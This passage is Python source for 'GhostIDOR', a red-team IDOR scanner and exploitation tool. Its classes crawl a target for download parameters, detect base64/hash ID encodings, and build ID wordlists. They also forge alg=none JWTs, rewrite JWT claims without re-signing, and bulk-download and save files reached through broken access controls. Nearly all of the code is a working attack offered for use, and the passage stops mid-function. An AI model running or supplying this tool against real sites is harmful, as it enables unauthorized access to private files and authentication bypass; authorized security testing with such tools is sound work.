#!/usr/bin/env python3
"""
GhostIDOR v2.4 - Comprehensive IDOR Vulnerability Scanner
Developed for Ghost Ops Security

NEW in v2.3:
- Parameter fuzzing with -p flag (e.g., -p uid=FUZZ)
- Data fuzzing with -d flag supporting FUZZ keyword
- Wordlist support (-w/--wordlist) for custom fuzzing values
- Multi-threaded fuzzing (--threads) for high-speed testing
- Automatic file extraction and saving when IDOR found
- Enhanced output showing successful commands for each finding

v2.2:
- JavaScript source analysis for IDOR patterns
- Full request/response logging when vulnerabilities found
- Explicit GET/POST method selection
- Enhanced reporting with curl reproduction commands
"""

import argparse
import requests
import json
import sys
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from typing import List, Dict, Tuple, Optional, Any
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import hashlib
import base64
import uuid
import textwrap
import os
from pathlib import Path
import mimetypes
from threading import Lock

# ANSI colors for Ghost Ops branding
class Colors:
    GHOST = '\033[95m'      # Purple/Magenta for Ghost theme
    GREEN = '\033[92m'      # Success
    YELLOW = '\033[93m'     # Warning
    RED = '\033[91m'        # Danger
    BLUE = '\033[94m'       # Info
    CYAN = '\033[96m'       # Highlight
    RESET = '\033[0m'       # Reset
    BOLD = '\033[1m'        # Bold
    DIM = '\033[2m'         # Dim

@dataclass
class IDORResult:
    """Store IDOR vulnerability findings with full request/response"""
    url: str
    method: str
    parameter: str
    original_value: str
    tested_value: str
    status_code: int
    response_length: int
    response_hash: str
    vulnerable: bool
    evidence: str
    technique: str
    encoding_detected: Optional[str] = None
    confidence: str = "medium"  # low, medium, high, critical
    # Full request/response capture
    request_headers: Optional[Dict] = None
    request_body: Optional[str] = None
    response_headers: Optional[Dict] = None
    response_body: Optional[str] = None
    curl_command: Optional[str] = None
    # File extraction info
    saved_file: Optional[str] = None
    file_info: Optional[Dict] = None
    # NEW: Linked files extracted from response
    linked_files: Optional[List[Dict]] = None



class SmartRecon:
    """NEW v2.4: Smart reconnaissance for automatic IDOR pattern detection"""
    
    @staticmethod
    def analyze_and_exploit(url: str, session: requests.Session, args) -> Dict:
        """Main smart recon function - analyzes target and generates exploitation strategy"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}║          SMART RECON MODE - Automated IDOR Exploitation          ║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
        
        recon = {
            'success': False,
            'parameter_name': None,
            'encoding_chain': [],
            'wordlist_file': 'employee_ids_auto.txt',
            'download_url': None,
            'decoded_id': None
        }
        
        # Step 1: Fetch and analyze target
        print(f"  {Colors.BLUE}[1]{Colors.RESET} Analyzing target page...")
        try:
            response = session.get(url, timeout=10, allow_redirects=True)
            print(f"    {Colors.GREEN}[+] Page loaded ({len(response.content)} bytes){Colors.RESET}")
        except Exception as e:
            print(f"    {Colors.RED}[!] Error: {e}{Colors.RESET}")
            return recon
        
        # Step 2: Find download links
        print(f"\n  {Colors.BLUE}[2]{Colors.RESET} Searching for download patterns...")
        download_links = []
        import re
        patterns = [
            r'href=["\']([^"\']*download[^"\']*\?[^"\']*)["\']',
            r'href=["\']([^"\']*\.php\?[^"\']*(?:contract|file|doc|id)[^"\']*)["\']',
        ]
        
        for pattern in patterns:
            for match in re.findall(pattern, response.text, re.IGNORECASE):
                full_url = SmartRecon._make_absolute(match, url)
                if '?' in full_url:
                    download_links.append(full_url)
        
        download_links = list(set(download_links))
        
        if download_links:
            print(f"    {Colors.GREEN}[+] Found {len(download_links)} download link(s){Colors.RESET}")
            test_url = download_links[0]
            if args.verbose:
                for i, link in enumerate(download_links[:3], 1):
                    print(f"      {i}. {link}")
        else:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            if parsed.query:
                print(f"    {Colors.YELLOW}[*] No links found, using provided URL{Colors.RESET}")
                test_url = url
            else:
                print(f"    {Colors.RED}[-] No download links or parameters found{Colors.RESET}")
                return recon
        
        # Step 3: Extract parameters
        print(f"\n  {Colors.BLUE}[3]{Colors.RESET} Extracting parameters...")
        from urllib.parse import urlparse, parse_qs, unquote
        parsed = urlparse(test_url)
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"    {Colors.RED}[-] No parameters found in URL{Colors.RESET}")
            return recon
        
        param_name = list(params.keys())[0]
        param_value = params[param_name][0]
        print(f"    {Colors.GREEN}[+] Parameter: {Colors.CYAN}{param_name}{Colors.RESET} = {param_value[:50]}")
        
        # Step 4: Test download and detect encoding pattern
        print(f"\n  {Colors.BLUE}[4]{Colors.RESET} Testing download and detecting encoding pattern...")
        
        try:
            test_resp = session.get(test_url, timeout=10, allow_redirects=True)
            
            if test_resp.status_code != 200:
                print(f"      {Colors.YELLOW}[-] Download returned {test_resp.status_code}{Colors.RESET}")
            else:
                print(f"      {Colors.GREEN}[+] Download successful ({len(test_resp.content)} bytes){Colors.RESET}")
            
            filename = "unknown"
            if 'Content-Disposition' in test_resp.headers:
                m = re.search(r'filename=["\']?([^"\';\n]+)', test_resp.headers['Content-Disposition'])
                if m:
                    filename = m.group(1).strip('"\'"')
            
            print(f"      {Colors.CYAN}Filename:{Colors.RESET} {filename}")
            
            decoded_param = unquote(param_value)
            print(f"      {Colors.CYAN}Parameter:{Colors.RESET} {param_name}={decoded_param}")
            
            pattern_detected = False
            
            # Try base64 decode
            import base64
            import hashlib
            try:
                decoded_id = base64.b64decode(decoded_param).decode('utf-8', errors='ignore')
                if decoded_id.isprintable() and len(decoded_id) < 50:
                    print(f"      {Colors.CYAN}Base64 decoded:{Colors.RESET} '{decoded_id}'")
                    
                    # Check for MD5
                    md5_hash = hashlib.md5(decoded_id.encode()).hexdigest()
                    if md5_hash.lower() in filename.lower():
                        print(f"      {Colors.BOLD}{Colors.GREEN}[!] PATTERN DETECTED: base64(ID) → MD5{Colors.RESET}")
                        print(f"        {Colors.CYAN}MD5('{decoded_id}') = {md5_hash}{Colors.RESET}")
                        recon['success'] = True
                        recon['parameter_name'] = param_name
                        recon['encoding_chain'] = ['base64', 'md5']
                        recon['download_url'] = test_url
                        recon['decoded_id'] = decoded_id
                        pattern_detected = True
                    
                    # Check for SHA1
                    if not pattern_detected:
                        sha1_hash = hashlib.sha1(decoded_id.encode()).hexdigest()
                        if sha1_hash.lower() in filename.lower():
                            print(f"      {Colors.BOLD}{Colors.GREEN}[!] PATTERN DETECTED: base64(ID) → SHA1{Colors.RESET}")
                            recon['success'] = True
                            recon['parameter_name'] = param_name
                            recon['encoding_chain'] = ['base64', 'sha1']
                            recon['download_url'] = test_url
                            recon['decoded_id'] = decoded_id
                            pattern_detected = True
                    
                    # Check for SHA256
                    if not pattern_detected:
                        sha256_hash = hashlib.sha256(decoded_id.encode()).hexdigest()
                        if sha256_hash.lower() in filename.lower():
                            print(f"      {Colors.BOLD}{Colors.GREEN}[!] PATTERN DETECTED: base64(ID) → SHA256{Colors.RESET}")
                            recon['success'] = True
                            recon['parameter_name'] = param_name
                            recon['encoding_chain'] = ['base64', 'sha256']
                            recon['download_url'] = test_url
                            recon['decoded_id'] = decoded_id
                            pattern_detected = True
            except:
                pass
            
            if not pattern_detected:
                print(f"      {Colors.YELLOW}[-] Could not determine encoding pattern{Colors.RESET}")
        
        except Exception as e:
            print(f"      {Colors.YELLOW}[!] Error: {e}{Colors.RESET}")
        
        # Step 5: Generate wordlist if pattern detected
        if recon['success']:
            print(f"\n  {Colors.BLUE}[5]{Colors.RESET} Auto-generating wordlist...")
            
            try:
                with open(recon['wordlist_file'], 'w') as f:
                    for i in range(1, 21):
                        if 'base64' in recon['encoding_chain']:
                            encoded = base64.b64encode(str(i).encode()).decode()
                            f.write(encoded + '\n')
                        else:
                            f.write(str(i) + '\n')
                
                print(f"    {Colors.GREEN}[+] Created {recon['wordlist_file']} with 20 payloads{Colors.RESET}")
                print(f"\n  {Colors.YELLOW}[*] Smart Recon complete! Starting fuzzing...{Colors.RESET}\n")
            except Exception as e:
                print(f"    {Colors.RED}[!] Error creating wordlist: {e}{Colors.RESET}")
                recon['success'] = False
        
        return recon
    
    @staticmethod
    def _make_absolute(link: str, base_url: str) -> str:
        """Convert relative URL to absolute"""
        from urllib.parse import urlparse
        if link.startswith('http'):
            return link
        parsed = urlparse(base_url)
        if link.startswith('/'):
            return f"{parsed.scheme}://{parsed.netloc}{link}"
        base_path = '/'.join(parsed.path.split('/')[:-1])
        if base_path:
            return f"{parsed.scheme}://{parsed.netloc}{base_path}/{link}"
        return f"{parsed.scheme}://{parsed.netloc}/{link}"


class JavaScriptAnalyzer:
    """Analyze JavaScript source code for IDOR patterns"""
    
    @staticmethod
    def analyze_js_for_idor(js_content: str) -> Dict:
        """Analyze JavaScript for potential IDOR vulnerabilities"""
        findings = {
            'api_endpoints': [],
            'id_parameters': [],
            'encoding_functions': [],
            'auth_headers': [],
            'suspicious_patterns': [],
            'encoding_chains': []  # NEW: Store detected encoding chains
        }
        
        # Find API endpoints
        api_patterns = [
            r'["\']([/api/][^"\']+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
            r'\.get\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
            r'url:\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            findings['api_endpoints'].extend(matches)
        
        # Find ID parameters
        id_patterns = [
            r'["\'](\w*[Ii][Dd]\w*)["\']',
            r'userId["\']?\s*[:=]',
            r'accountId["\']?\s*[:=]',
            r'customerId["\']?\s*[:=]',
            r'orderId["\']?\s*[:=]',
            r'documentId["\']?\s*[:=]',
        ]
        
        for pattern in id_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            findings['id_parameters'].extend(matches)
        
        # Find encoding/hashing functions
        encoding_patterns = [
            (r'btoa\(', 'base64 encoding'),
            (r'atob\(', 'base64 decoding'),
            (r'md5\(', 'MD5 hashing'),
            (r'sha1\(', 'SHA1 hashing'),
            (r'sha256\(', 'SHA256 hashing'),
            (r'CryptoJS\.MD5', 'CryptoJS MD5'),
            (r'CryptoJS\.SHA', 'CryptoJS SHA'),
            (r'\.toString\(16\)', 'hex encoding'),
            (r'encodeURIComponent', 'URL encoding'),
        ]
        
        for pattern, desc in encoding_patterns:
            if re.search(pattern, js_content, re.IGNORECASE):
                findings['encoding_functions'].append(desc)
        
        # NEW: Extract encoding chains from JavaScript functions
        findings['encoding_chains'].extend(
            JavaScriptAnalyzer.extract_encoding_chains(js_content)
        )
        
        # Find auth headers
        auth_patterns = [
            r'Authorization["\']?\s*[:=]\s*["\']([^"\']+)',
            r'X-API-Key["\']?\s*[:=]\s*["\']([^"\']+)',
            r'X-Auth-Token["\']?\s*[:=]\s*["\']([^"\']+)',
            r'Bearer\s+["\']?([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)',
        ]
        
        for pattern in auth_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            findings['auth_headers'].extend(matches)
        
        # Find suspicious patterns
        suspicious = [
            (r'getUserData\(\s*(\w+)', 'getUserData function with parameter'),
            (r'getUser\(\s*(\w+)', 'getUser function with parameter'),
            (r'loadProfile\(\s*(\w+)', 'loadProfile function with parameter'),
            (r'fetchDocument\(\s*(\w+)', 'fetchDocument function with parameter'),
            (r'downloadFile\(\s*(\w+)', 'downloadFile function with parameter'),
            (r'download\w*\(\s*(\w+)', 'download function with parameter'),
            (r'if\s*\(\s*userId\s*==', 'client-side userId check'),
            (r'if\s*\(\s*isAdmin', 'client-side admin check'),
        ]
        
        for pattern, desc in suspicious:
            if re.search(pattern, js_content, re.IGNORECASE):
                findings['suspicious_patterns'].append(desc)
        
        # Remove duplicates
        for key in findings:
            if isinstance(findings[key], list):
                findings[key] = list(set(findings[key]))
        
        return findings
    
    @staticmethod
    def extract_encoding_chains(js_content: str) -> List[Dict]:
        """
        Extract encoding chains from JavaScript functions
        Example: CryptoJS.MD5(btoa(uid)) -> ['base64', 'md5']
        """
        chains = []
        
        # Pattern to match common encoding chains
        # Example: CryptoJS.MD5(btoa(variable))
        patterns = [
            # CryptoJS.MD5(btoa(var))
            r'CryptoJS\.MD5\(\s*btoa\(\s*([^)]+)\s*\)\s*\)',
            # md5(btoa(var))
            r'md5\(\s*btoa\(\s*([^)]+)\s*\)\s*\)',
            # CryptoJS.SHA256(btoa(var))
            r'CryptoJS\.SHA256\(\s*btoa\(\s*([^)]+)\s*\)\s*\)',
            # btoa(var) alone
            r'btoa\(\s*([^)]+)\s*\)',
            # CryptoJS.MD5(var)
            r'CryptoJS\.MD5\(\s*([^)]+)\s*\)',
        ]
        
        for pattern in patterns:
            matches = re.finditer(pattern, js_content, re.IGNORECASE)
            for match in matches:
                full_match = match.group(0)
                variable = match.group(1).strip()
                
                # Determine encoding chain
                chain = {
                    'original': full_match,
                    'variable': variable,
                    'encodings': []
                }
                
                # Detect encodings in order
                if 'btoa' in full_match.lower():
                    chain['encodings'].append('base64')
                if 'md5' in full_match.lower():
                    chain['encodings'].append('md5')
                if 'sha1' in full_match.lower():
                    chain['encodings'].append('sha1')
                if 'sha256' in full_match.lower():
                    chain['encodings'].append('sha256')
                if 'sha512' in full_match.lower():
                    chain['encodings'].append('sha512')
                
                if chain['encodings']:
                    chains.append(chain)
        
        return chains
    
    @staticmethod
    def fetch_and_analyze_js(url: str, session: requests.Session) -> List[Dict]:
        """Fetch JavaScript files and analyze them"""
        results = []
        
        try:
            # Get the main page
            response = session.get(url, timeout=10)
            
            # Find JavaScript files
            js_files = []
            
            # Look for <script src="...">
            script_tags = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
            js_files.extend(script_tags)
            
            # Look for inline references
            inline_js = re.findall(r'["\']([^"\']*\.js[^"\']*)["\']', response.text)
            js_files.extend(inline_js)
            
            # Convert relative URLs to absolute
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            js_files_absolute = []
            for js_file in set(js_files):
                if js_file.startswith('http'):
                    js_files_absolute.append(js_file)
                elif js_file.startswith('//'):
                    js_files_absolute.append(f"{parsed_url.scheme}:{js_file}")
                elif js_file.startswith('/'):
                    js_files_absolute.append(f"{base_url}{js_file}")
                else:
                    js_files_absolute.append(f"{base_url}/{js_file}")
            
            # Analyze each JS file (limit to first 10)
            for js_url in js_files_absolute[:10]:
                try:
                    js_response = session.get(js_url, timeout=10)
                    if js_response.status_code == 200:
                        analysis = JavaScriptAnalyzer.analyze_js_for_idor(js_response.text)
                        analysis['source_url'] = js_url
                        results.append(analysis)
                except:
                    continue
            
        except:
            pass
        
        return results

class EncodingDetector:
    """Detect and handle various encoding schemes"""
    
    @staticmethod
    def detect_encoding(value: str) -> List[str]:
        """Detect what encoding/hashing might be used"""
        encodings = []
        
        # Check for JWT token
        if re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$', value):
            encodings.append('jwt')
        
        # Check for UUID/GUID
        if re.match(r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', value, re.IGNORECASE):
            encodings.append('uuid')
        
        # Check for hex (MD5, SHA1, etc.)
        if re.match(r'^[a-f0-9]{32}$', value, re.IGNORECASE):
            encodings.append('md5')
        if re.match(r'^[a-f0-9]{40}$', value, re.IGNORECASE):
            encodings.append('sha1')
        if re.match(r'^[a-f0-9]{64}$', value, re.IGNORECASE):
            encodings.append('sha256')
        if re.match(r'^[a-f0-9]{128}$', value, re.IGNORECASE):
            encodings.append('sha512')
        
        # Check for base64/base64url
        try:
            if len(value) % 4 == 0 and re.match(r'^[A-Za-z0-9+/]+=*$', value):
                decoded = base64.b64decode(value)
                if decoded.decode('utf-8', errors='ignore').isprintable():
                    encodings.append('base64')
        except:
            pass
        
        # Check for base64url (URL-safe base64)
        try:
            if re.match(r'^[A-Za-z0-9_-]+$', value) and len(value) > 10:
                padding = 4 - (len(value) % 4)
                if padding != 4:
                    padded = value + ('=' * padding)
                else:
                    padded = value
                decoded = base64.urlsafe_b64decode(padded)
                if decoded.decode('utf-8', errors='ignore').isprintable():
                    encodings.append('base64url')
        except:
            pass
        
        # Check for URL encoding
        if '%' in value:
            encodings.append('url_encoded')
        
        # Check for hex encoding (not hash)
        try:
            if len(value) % 2 == 0 and re.match(r'^[a-f0-9]+$', value, re.IGNORECASE) and len(value) < 128:
                decoded = bytes.fromhex(value).decode('utf-8', errors='ignore')
                if decoded.isprintable() and len(decoded) < len(value) / 2:
                    encodings.append('hex_encoded')
        except:
            pass
        
        return encodings
    
    @staticmethod
    def decode_jwt(token: str) -> Optional[Dict]:
        """Decode JWT token without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }
        except:
            return None
    
    @staticmethod
    def generate_encoded_value(plain_value: str, encoding_chain: List[str]) -> str:
        """Apply encoding chain to generate encoded value"""
        result = plain_value
        
        for encoding in encoding_chain:
            if encoding == 'base64':
                result = base64.b64encode(result.encode()).decode()
            elif encoding == 'base64url':
                result = base64.urlsafe_b64encode(result.encode()).decode().rstrip('=')
            elif encoding == 'md5':
                result = hashlib.md5(result.encode()).hexdigest()
            elif encoding == 'sha1':
                result = hashlib.sha1(result.encode()).hexdigest()
            elif encoding == 'sha256':
                result = hashlib.sha256(result.encode()).hexdigest()
            elif encoding == 'sha512':
                result = hashlib.sha512(result.encode()).hexdigest()
            elif encoding == 'url_encoded':
                result = quote(result)
            elif encoding == 'hex_encoded':
                result = result.encode().hex()
            elif encoding == 'uuid':
                namespace = uuid.UUID('6ba7b810-9dad-11d1-80b4-00c04fd430c8')
                result = str(uuid.uuid5(namespace, result))
        
        return result
    
    @staticmethod
    def try_decode(value: str) -> Optional[Dict]:
        """Attempt to decode a value and return info"""
        decoded_info = {'original': value, 'decoded': [], 'possible_type': []}
        
        # Try JWT
        jwt_data = EncodingDetector.decode_jwt(value)
        if jwt_data:
            decoded_info['decoded'].append(jwt_data)
            decoded_info['possible_type'].append('jwt')
            if 'payload' in jwt_data:
                for key in ['sub', 'user_id', 'id', 'uid']:
                    if key in jwt_data['payload']:
                        decoded_info['extracted_id'] = jwt_data['payload'][key]
        
        # Try base64
        try:
            decoded = base64.b64decode(value).decode('utf-8')
            if decoded.isprintable():
                decoded_info['decoded'].append(decoded)
                decoded_info['possible_type'].append('base64')
        except:
            pass
        
        # Try base64url
        try:
            padding = 4 - (len(value) % 4)
            if padding != 4:
                padded = value + ('=' * padding)
            else:
                padded = value
            decoded = base64.urlsafe_b64decode(padded).decode('utf-8')
            if decoded.isprintable():
                decoded_info['decoded'].append(decoded)
                decoded_info['possible_type'].append('base64url')
        except:
            pass
        
        # Try URL decode
        try:
            decoded = unquote(value)
            if decoded != value:
                decoded_info['decoded'].append(decoded)
                decoded_info['possible_type'].append('url_encoded')
        except:
            pass
        
        # Try hex decode
        try:
            if len(value) % 2 == 0:
                decoded = bytes.fromhex(value).decode('utf-8')
                if decoded.isprintable():
                    decoded_info['decoded'].append(decoded)
                    decoded_info['possible_type'].append('hex_encoded')
        except:
            pass
        
        return decoded_info if decoded_info['decoded'] else None
    
    @staticmethod
    def bruteforce_encoding_chain(original_value: str, target_hash: str, max_depth: int = 3) -> Optional[List[str]]:
        """Bruteforce common encoding chains to match target hash"""
        common_encodings = [
            ['md5'], ['sha1'], ['sha256'], ['sha512'],
            ['base64'], ['base64url'], ['hex_encoded'],
            ['base64', 'md5'], ['base64', 'sha1'], ['base64', 'sha256'],
            ['base64url', 'md5'], ['base64url', 'sha256'],
            ['url_encoded', 'md5'], ['hex_encoded', 'md5'],
            ['base64', 'base64', 'md5'], ['md5', 'base64'],
            ['sha1', 'base64'], ['uuid'],
        ]
        
        for chain in common_encodings:
            try:
                result = EncodingDetector.generate_encoded_value(original_value, chain)
                if result.lower() == target_hash.lower():
                    return chain
            except:
                continue
        
        return None

class JWTManipulator:
    """Manipulate JWT tokens for IDOR testing"""
    
    @staticmethod
    def modify_jwt_claim(token: str, claim: str, new_value: any) -> Optional[str]:
        """Modify a JWT claim without re-signing"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
            payload[claim] = new_value
            
            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            return f"{parts[0]}.{new_payload}.{parts[2]}"
        except:
            return None
    
    @staticmethod
    def generate_unsigned_jwt(payload: Dict) -> str:
        """Generate unsigned JWT (alg=none attack)"""
        header = {"alg": "none", "typ": "JWT"}
        
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}."

class FileExtractor:
    """Extract and save files from IDOR findings"""
    
    def __init__(self, output_dir: str = "ghostidor_findings"):
        self.output_dir = output_dir
        self.lock = Lock()
        self._ensure_output_dir()
        self.downloaded_links = set()  # Track downloaded links to avoid duplicates
    
    def _ensure_output_dir(self):
        """Create output directory if it doesn't exist"""
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
    
    def extract_links_from_response(self, response_text: str, base_url: str) -> List[str]:
        """Extract file links from response content (like grep in bash script)"""
        links = []
        
        # Common file link patterns
        patterns = [
            # HTML href/src attributes
            r'href=["\']([^"\']*\.(?:pdf|txt|doc|docx|xlsx|zip|jpg|png|gif))["\']',
            r'src=["\']([^"\']*\.(?:pdf|txt|doc|docx|xlsx|zip|jpg|png|gif))["\']',
            # Direct paths in responses
            r'["\']?(/[^"\'<>\s]*\.(?:pdf|txt|doc|docx|xlsx|zip|jpg|png|gif))["\']?',
            # API responses with file paths
            r'"(?:file|path|url|document|download)":\s*"([^"]+\.(?:pdf|txt|doc|docx|xlsx|zip|jpg|png|gif))"',
            # Generic file paths
            r'\/[\w\-\/]+\.(?:pdf|txt|doc|docx|xlsx|zip|jpg|png|gif)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            links.extend(matches)
        
        # Convert relative URLs to absolute
        parsed_base = urlparse(base_url)
        base_scheme = parsed_base.scheme
        base_netloc = parsed_base.netloc
        
        absolute_links = []
        for link in set(links):
            if link.startswith('http'):
                absolute_links.append(link)
            elif link.startswith('//'):
                absolute_links.append(f"{base_scheme}:{link}")
            elif link.startswith('/'):
                absolute_links.append(f"{base_scheme}://{base_netloc}{link}")
            else:
                # Relative path
                absolute_links.append(f"{base_scheme}://{base_netloc}/{link.lstrip('./')}")
        
        return list(set(absolute_links))  # Remove duplicates
    
    def download_file_from_url(self, url: str, session: requests.Session, param_name: str, value: str) -> Optional[Dict]:
        """Download a file from a URL (like wget in bash script)"""
        # Skip if already downloaded
        if url in self.downloaded_links:
            return None
        
        try:
            response = session.get(url, timeout=30, stream=True)
            if response.status_code == 200 and len(response.content) > 0:
                self.downloaded_links.add(url)
                file_info = self.save_file(response, param_name, value)
                
                # If it's a text file, display content immediately (like bash script)
                if file_info['extension'] in ['txt', 'log', 'flag']:
                    try:
                        content = response.content.decode('utf-8', errors='ignore')
                        file_info['text_content'] = content
                        file_info['is_text'] = True
                    except:
                        file_info['is_text'] = False
                else:
                    file_info['is_text'] = False
                
                file_info['source_url'] = url
                return file_info
        except Exception as e:
            pass
        
        return None
    
    def _get_file_extension(self, response: requests.Response, default: str = "bin") -> str:
        """Determine file extension from response"""
        # Check Content-Type header
        content_type = response.headers.get('Content-Type', '')
        
        if content_type:
            ext = mimetypes.guess_extension(content_type.split(';')[0].strip())
            if ext:
                return ext.lstrip('.')
        
        # Check Content-Disposition header
        content_disp = response.headers.get('Content-Disposition', '')
        if 'filename=' in content_disp:
            filename = re.search(r'filename[^;=\n]*=((["\']).*?\2|[^;\n]*)', content_disp)
            if filename:
                fname = filename.group(1).strip('"\'')
                ext = fname.split('.')[-1] if '.' in fname else None
                if ext:
                    return ext
        
        # Try to detect from content
        content_start = response.content[:20]
        
        if content_start.startswith(b'%PDF'):
            return 'pdf'
        elif content_start.startswith(b'\x89PNG'):
            return 'png'
        elif content_start.startswith(b'\xff\xd8\xff'):
            return 'jpg'
        elif content_start.startswith(b'GIF8'):
            return 'gif'
        elif content_start.startswith(b'PK\x03\x04'):
            return 'zip'
        elif content_start.startswith(b'{') or content_start.startswith(b'['):
            return 'json'
        elif content_start.startswith(b'<'):
            return 'html'
        
        return default
    
    def save_file(self, response: requests.Response, param_name: str, value: str) -> Dict:
        """Save file from response and return file info"""
        with self.lock:
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            file_ext = self._get_file_extension(response)
            
            # Sanitize value for filename
            safe_value = re.sub(r'[^\w\-.]', '_', str(value))[:50]
            filename = f"{param_name}_{safe_value}_{timestamp}.{file_ext}"
            filepath = os.path.join(self.output_dir, filename)
            
            # Save the file
            with open(filepath, 'wb') as f:
                f.write(response.content)
            
            # Get file info
            file_size = os.path.getsize(filepath)
            file_hash = hashlib.md5(response.content).hexdigest()
            
            file_info = {
                'filename': filename,
                'filepath': filepath,
                'size': file_size,
                'size_human': self._human_readable_size(file_size),
                'md5': file_hash,
                'content_type': response.headers.get('Content-Type', 'unknown'),
                'extension': file_ext
            }
            
            return file_info
    
    @staticmethod
    def _human_readable_size(size_bytes: int) -> str:
        """Convert bytes to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} TB"

class FuzzPayloadGenerator:
    """Generate fuzzing payloads from wordlist or defaults"""
    
    @staticmethod
    def load_wordlist(filepath: str) -> List[str]:
        """Load payloads from wordlist file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.RESET}")
            return []
    
    @staticmethod
    def generate_default_payloads(count: int = 100) -> List[str]:
        """Generate default numeric payloads"""
        return [str(i) for i in range(1, count + 1)]
    
    @staticmethod
    def generate_smart_payloads(original_value: str = None) -> List[str]:
        """Generate smart payloads based on original value"""
        payloads = []
        
        # Numeric payloads
        payloads.extend([str(i) for i in range(1, 101)])
        payloads.extend([str(i) for i in range(1000, 1021)])
        
        # Common IDs
        payloads.extend(['admin', 'administrator', 'root', 'test', 'user'])
        payloads.extend([f'user{i}' for i in range(1, 11)])
        
        # UUIDs (common patterns)
        for i in range(1, 6):
            payloads.append(str(uuid.UUID(int=i)))
        
        # If original value provided, generate variations
        if original_value:
            if original_value.isdigit():
                orig_int = int(original_value)
                payloads.extend([
                    str(orig_int - 1), str(orig_int + 1),
                    str(orig_int - 10), str(orig_int + 10),
                    str(orig_int * 2), str(orig_int // 2)
                ])
        
        return list(set(payloads))  # Remove duplicates

class GhostIDOR:
    """Main IDOR testing class"""
    
    def __init__(self, args):
        self.args = args
        self.smart_recon_result = None
        self.session = self._create_session()
        self.results = []
        self.baseline_responses = {}
        self.encoding_detector = EncodingDetector()
        self.jwt_manipulator = JWTManipulator()
        self.js_analyzer = JavaScriptAnalyzer()
        self.file_extractor = FileExtractor(args.output_dir)
        self.discovered_encoding_chains = {}
        self.results_lock = Lock()
        self.progress_lock = Lock()
        self.tested_count = 0
        self.found_count = 0
        
        self._print_banner()
        
    def _create_session(self) -> requests.Session:
        """Create requests session with retry logic"""
        session = requests.Session()
        
        headers = {'User-Agent': self.args.user_agent}
        
        if self.args.headers:
            for header in self.args.headers:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
        
        session.headers.update(headers)
        
        if self.args.cookies:
            for cookie in self.args.cookies:
                key, value = cookie.split('=', 1)
                session.cookies.set(key.strip(), value.strip())
        
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=self.args.threads, 
                            pool_maxsize=self.args.threads)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session
    
    def _print_banner(self):
        """Display Ghost Ops Security banner"""
        banner = f"""
{Colors.GHOST}{Colors.BOLD}
   _____ _               _   _____ _____   ____  _____  
  / ____| |             | | |_   _|  __ \\ / __ \\|  __ \\ 
 | |  __| |__   ___  ___| |_  | | | |  | | |  | | |__) |
 | | |_ | '_ \\ / _ \\/ __| __| | | | |  | | |  | |  _  / 
 | |__| | | | | (_) \\__ \\ |_ _| |_| |__| | |__| | | \\ \\ 
  \\_____|_| |_|\\___/|___/\\__|_____|_____/ \\____/|_|  \\_\\
{Colors.RESET}
{Colors.CYAN}        Comprehensive IDOR Vulnerability Scanner{Colors.RESET}
{Colors.CYAN}        v2.4 - Smart Recon & Automated Exploitation{Colors.RESET}
{Colors.DIM}              Ghost Ops Security - Red Team Tools{Colors.RESET}
{Colors.DIM}        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
"""
        print(banner)
    
    def _hash_response(self, content: str) -> str:
        """Create hash of response content for comparison"""
